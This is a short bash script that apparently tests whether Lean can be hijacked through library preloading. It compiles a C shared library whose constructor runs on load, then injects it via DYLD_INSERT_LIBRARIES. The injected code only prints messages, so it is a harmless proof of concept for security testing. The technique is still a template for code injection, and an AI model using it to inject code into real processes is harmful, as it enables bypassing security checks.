#!/bin/bash
# Test if LD_PRELOAD/DYLD_INSERT_LIBRARIES can inject code into Lean

echo "[TEST] Checking if library preloading works with Lean"

# Create a malicious library
cat > /tmp/preload_attack.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>

__attribute__((constructor))
static void preload_attack(void) {
    fprintf(stderr, "\n[ATTACK] Code injected via LD_PRELOAD/DYLD_INSERT_LIBRARIES!\n");
    fprintf(stderr, "[ATTACK] This bypasses all Lean security checks\n");
    fprintf(stderr, "[ATTACK] Running with PID: %d\n\n", getpid());
}
EOF

clang -shared -fPIC /tmp/preload_attack.c -o /tmp/preload_attack.dylib

echo "Testing DYLD_INSERT_LIBRARIES (macOS):"
DYLD_INSERT_LIBRARIES=/tmp/preload_attack.dylib lean --version 2>&1 | grep -E "(ATTACK|Lean)"

echo -e "\nTesting DYLD_FORCE_FLAT_NAMESPACE (macOS alternate method):"
DYLD_FORCE_FLAT_NAMESPACE=1 DYLD_INSERT_LIBRARIES=/tmp/preload_attack.dylib lean --version 2>&1 | grep -E "(ATTACK|Lean)"
